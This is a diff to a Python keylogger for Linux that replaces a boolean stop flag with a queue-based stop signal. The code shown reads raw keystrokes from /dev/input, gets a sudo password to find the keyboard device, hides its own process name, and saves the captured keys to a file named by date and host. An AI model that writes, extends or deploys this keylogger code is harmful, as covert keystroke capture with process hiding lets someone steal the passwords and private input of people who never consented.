@@ -1,5 +1,6 @@
 import datetime
 import os
+import queue
 import struct
 import subprocess
 import getpass
@@ -286,7 +287,7 @@ def __get_kb_event(password: str, cmd: str):
 
 
 def __perform_keylog(event_x: str,
-                     stop: bool):
+                     signal_queue: queue.Queue):
     """
     Performs keylogger logic and records each keystroke from user
     into a buffer.
@@ -294,8 +295,8 @@ def __perform_keylog(event_x: str,
     :param event_x:
             A string representing the corresponding kb event
 
-    :param stop:
-            A boolean representing the signal used to stop keylogger
+    :param signal_queue:
+            A thread-safe queue that stores the signal to 'STOP'
 
     :return buffer:
             A string containing the user recorded keystrokes
@@ -314,7 +315,7 @@ def __perform_keylog(event_x: str,
         key_state = {}
 
         with open(f"/dev/input/{event_x}", "rb") as file:
-            while True and stop is False:
+            while signal_queue.empty():
                 # Event FORMAT: {timestamp, time_in_microseconds, event_type, event_code, event_value}
                 event_x = file.read(24)
                 _, _, event_type, event_code, event_value = struct.unpack("LLHHi", event_x)
@@ -357,7 +358,7 @@ def __perform_keylog(event_x: str,
         return buffer
 
 
-def main():
+def main(signal_queue: queue.Queue):
     try:
         # Print Keylog Title
         print("===================================== || KEYLOGGER PROGRAM || =====================================")
@@ -369,7 +370,6 @@ def main():
         __hide_process_name()
 
         # Initialize Variables
-        signal_stop = False
         sudo_password = getpass.getpass("[+] Enter your sudo password: ")  # Get the sudo password from the user
         command = "sudo -S cat /proc/bus/input/devices | grep \"Handlers=sysrq kbd\""
 
@@ -377,7 +377,7 @@ def main():
         event = __get_kb_event(sudo_password, command)
 
         # b) Perform keylogger by opening the "/dev/input/eventX" file in the read-binary mode
-        keylog_buffer = __perform_keylog(event, signal_stop)
+        keylog_buffer = __perform_keylog(event, signal_queue)
 
         # c) Get date and host information (for appending to .txt file name)
         file_name = __create_file_name()
@@ -388,4 +388,4 @@ def main():
         return file_name
 
     except KeyboardInterrupt as e:
-        print("[+] KEYLOGGER STOPPED: A KeyboardInterrupt was called (program now terminating...)")
+        print(f"[+] KEYLOGGER STOPPED: A KeyboardInterrupt was called (program now terminating...) : {str(e)}")
